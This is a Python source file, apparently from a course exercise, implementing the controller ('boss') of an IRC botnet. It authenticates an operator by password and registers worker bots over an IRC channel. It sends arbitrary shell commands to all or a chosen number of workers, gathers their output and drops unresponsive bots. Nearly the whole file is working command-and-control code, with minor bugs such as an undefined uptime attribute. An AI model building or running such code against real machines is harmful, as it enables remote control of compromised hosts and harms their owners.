import gevent
import random
import time

from gevent.event import Event
from optparse import OptionParser

from irc import IRCConnection, IRCBot

class Worker(object):
    def __init__(self, nick, name):
        self.nick = nick
        self.name = name
        self.awaiting_ping = Event()

class Task(object):

    _id = 0

    def __init__(self, command):
        self.command = command

        Task._id += 1
        self.id = Task._id

        self.data = {}

        self.workers = set()
        self.finished = set()

    def add(self, nick):
        self.data[nick] = ""
        self.workers.add(nick)

    def done(self, nick):
        self.finished.add(nick)

    def is_finished(self):
        return self.finished == self.workers


class BossServerBot(IRCBot):
    def __init__(self, conn, secret, channel):
        super(BossServerBot, self).__init__(conn)

        self.secret = secret
        self.boss = None

        self.channel = channel
        self.cmd_channel = channel + "-cmd"

        self.tasks = {}
        self.workers = {}

        self.starttime = time.time()

        self.start_worker_health_greenlet()

        self.logger = self.get_data_logger()
        self.conn_logger = self.conn.logger

        self.conn.join(self.channel)
        self.conn.join(self.cmd_channel)

    def get_data_logger(self):
        return self.conn.get_logger("botnet.data.logger", "botnet.data.log")

    def start_worker_health_greenlet(self):
        gevent.spawn(self._worker_health_greenlet)

    def _worker_health_greenlet(self):
        while True:
            self.send_workers("!worker-ping")

            for worker_nick in self.workers:
                self.workers[worker_nick].awaiting_ping.set()

            gevent.sleep(120)
            dead = []

            for worker_nick, worker in self.workers.items():
                if worker.awaiting_ping.is_set():
                    self.conn_logger.warn("worker [%s] dead" % worker_nick)
                    dead.append(worker_nick)

            if dead:
                self.send_user("Removed %d dead workers" % len(dead))
                for nick in dead:
                    self.unregister(nick)

    def send_workers(self, msg):
        self.respond(msg, self.cmd_channel)

    def send_user(self, msg):
        self.respond(msg, self.channel)

    def require_boss(self, callback):
        def inner(nick, msg, channel, *args, **kwargs):
            if nick != self.boss:
                return

            return callback(nick, msg, channel, *args, **kwargs)

        return inner

    def command_patterns(self):
        return (
            ('\/join', self.join_handler),
            ('\/quit', self.quit_handler),
            ('!auth (?P<password>.+)', self.auth),
            ('!execute (?:(?P<num_workers>\d+)? )?(?P<command>.+)', self.require_boss(self.execute_task)),
            ('!print(?: (?P<task_id>\d+))?', self.require_boss(self.print_task)),
            ('!register (?P<hostname>.+)', self.register),
            ('!stop', self.require_boss(self.stop)),
            ('!status', self.require_boss(self.status)),
            ('!task-data (?P<task_id>\d+):(?P<data>.+)', self.task_data),
            ('!task-finished (?P<task_id>\d+)', self.task_finished),
            ('!task-received (?P<task_id>\d+)', self.task_received),
            ('!worker-pong (?P<hostname>.+)', self.worker_health_handler),
            ('!uptime', self.require_boss(self.uptime)),
            ('!help', self.require_boss(self.help)),
        )

    """
    Commands
    """
    def join_handler(self, nick, message, channel):
        self.logger.debug("%s joined %s" % (nick, channel))

    def quit_handler(self, nick, message, channel):
        if channel == self.cmd_channel and nick in self.workers:
            self.logger.info("worker [%s] unregistered" % nick)
            self.unregister(nick)

    def auth(self, nick, message, channel, password):
        if not self.boss and password == self.secret:
            self.boss = nick
            self.logger.info("%s authenticated" % nick)
            return "Success"
        else:
            self.logger.error("%s authentication failed" % nick)

    def execute_task(self, nick, message, channel, command, num_workers=None):
        task = Task(command)
        self.tasks[task.id] = task

        if num_workers is None or int(num_workers) >= len(self.workers):
            num_workers = len(self.workers)
            self.send_workers("!worker-execute %s:%s" % (task.id, task.command))
        else:
            num_workers = int(num_workers)

            available_workers = set(self.workers.keys())

            msg_template = "!worker-execute %s:%s" % (task.id, task.command)

            max_msg_len = 500
            msg_len = len(msg_template % '')
            msg_diff = max_msg_len - msg_len
            
            available = msg_diff
            send_to = []

            sent = 0
            while sent < num_workers:
                worker_nick = available_workers.pop()
                send_to.append(worker_nick)
                sent += 1
                available -= (len(worker_nick) + 1)
                
                if available <= 0 or sent == num_workers:
                    self.send_workers(msg_template % (','.join(send_to)))
                    available = msg_diff
                    send_to = []

        self.send_user('Scheduled task: "%s" with id %s [%d workers]' % (
            task.command, task.id, num_workers
        ))

    def print_task(self, nick, message, channel, task_id=None):
        if not self.tasks:
            return 'No tasks to print'
        
        task_id = int(task_id or max(self.tasks.keys()))
        task = self.tasks[task_id]
        
        def printer(task):
            for nick, data in task.data.iteritems():
                worker = self.workers[nick]
                self.send_user('[%s:%s] - %s' % (worker.nick, worker.name, task.command))
                for line in data.splitlines():
                    self.send_user(line.strip())
                    gevent.sleep(.2)
        
        gevent.spawn(printer, task)

    def uptime(self, nick, message, channel):
        curr = time.time()
        seconds_diff = curr - self.start
        hours, remainder = divmod(seconds_diff, 3600)
        minutes, seconds = divmod(remainder, 60)
        return 'Uptime: %d:%02d:%02d' % (hours, minutes, seconds)
    
    def register(self, nick, message, channel, hostname):
        if nick not in self.workers:
            self.workers[nick] = Worker(nick, hostname)
            self.logger.info('added worker [%s]' % nick)
        else:
            self.logger.warn('already registered [%s]' % nick)
        
        return '!register-success %s' % self.cmd_channel
    
    def unregister(self, worker_nick):
        del(self.workers[worker_nick])
    
    def status(self, nick, message, channel):
        self.send_user('%s workers available' % len(self.workers))
        self.send_user('%s tasks have been scheduled' % len(self.tasks))
    
    def stop(self, nick, message, channel):
        self.send_workers('!worker-stop')
    
    def task_data(self, nick, message, channel, task_id, data):
        # add the data to the task's data
        self.tasks[int(task_id)].data[nick] += '%s\n' % data
    
    def task_finished(self, nick, message, channel, task_id):
        task = self.tasks[int(task_id)]
        task.done(nick)
        
        self.conn_logger.info('task [%s] finished by worker %s' % (task.id, nick))
        self.logger.info('%s:%s:%s' % (task.id, nick, task.data))
        
        if task.is_finished():
            self.send_user('Task %s completed by %s workers' % (task.id, len(task.data)))
    
    def task_received(self, nick, message, channel, task_id):
        task = self.tasks[int(task_id)]
        task.add(nick)
        self.conn_logger.info('task [%s] received by worker %s' % (task.id, nick))
    
    def worker_health_handler(self, nick, message, channel, hostname):
        if nick in self.workers:
            self.workers[nick].awaiting_ping.clear()
            self.logger.debug('Worker [%s] is alive' % nick)
        else:
            self.register(nick, message, channel, hostname)

    def help(self, nick, message, channel, hostname):
        self.send_user('!execute (num workers) <command> -- run "command" on workers')
        self.send_user('!print (task id) -- print output of tasks or task with id')
        self.send_user('!stop -- tell workers to stop their current task')
        self.send_user('!status -- get status on workers and tasks')
        self.send_user('!uptime -- boss uptime')


def get_parser():
    parser = OptionParser(usage='%prog [options]')
    parser.add_option('--server', '-s', dest='server', default='irc.freenode.net',
        help='IRC server to connect to')
    parser.add_option('--port', '-p', dest='port', default=6667,
        help='Port to connect on', type='int')
    parser.add_option('--nick', '-n', dest='nick', default='boss1234',
        help='Nick to use')
    parser.add_option('--secret', '-x', dest='secret', default='password')
    parser.add_option('--channel', '-c', dest='channel', default='#cs460botnet-jlchao2')
    parser.add_option('--logfile', '-l', dest='logfile')
    parser.add_option('--verbosity', '-v', dest='verbosity', default=1, type='int')
    
    return parser

if __name__ == '__main__':    
    parser = get_parser()
    (options, args) = parser.parse_args()
    
    conn = IRCConnection(options.server, options.port, options.nick, options.secret,
        options.logfile, options.verbosity)
    conn.connect()
    
    bot = BossServerBot(conn, options.secret, options.channel)
    
    conn.enter_event_loop()
